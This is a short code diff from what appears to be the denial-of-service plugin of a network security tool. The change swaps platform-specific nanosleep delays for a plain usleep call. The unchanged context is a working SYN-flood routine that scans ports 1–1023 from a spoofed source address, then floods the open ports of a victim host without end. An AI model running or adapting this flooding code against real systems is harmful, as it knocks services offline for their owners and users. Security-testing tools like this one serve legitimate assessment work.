@@ -176,12 +176,6 @@ EC_THREAD_FUNC(syn_flooder)
    u_int32 seq = 0xabadc0de;
    struct port_list *p;
 
-#if !defined(OS_WINDOWS)
-   struct timespec tm;
-   tm.tv_sec = 0;
-   tm.tv_nsec = 1000*1000;
-#endif
-
    /* variable not used */
    (void) EC_THREAD_PARAM;
 
@@ -191,11 +185,7 @@ EC_THREAD_FUNC(syn_flooder)
    /* First "scan" ports from 1 to 1024 */
    for (dport=1; dport<1024; dport++) {
       send_tcp(&fake_host, &victim_host, sport++, htons(dport), seq++, 0, TH_SYN, NULL, 0);
-#if !defined(OS_WINDOWS)
-      nanosleep(&tm, NULL);
-#else
       usleep(1000);
-#endif
    }
 
    INSTANT_USER_MSG("dos_attack: Starting attack...\n");
@@ -206,12 +196,7 @@ EC_THREAD_FUNC(syn_flooder)
 
       SLIST_FOREACH(p, &port_table, next)    
          send_tcp(&fake_host, &victim_host, sport++, p->port, seq++, 0, TH_SYN, NULL, 0);
-	 
-#if !defined(OS_WINDOWS)
-      nanosleep(&tm, NULL);
-#else
       usleep(1000);
-#endif
    }
    
    return NULL;
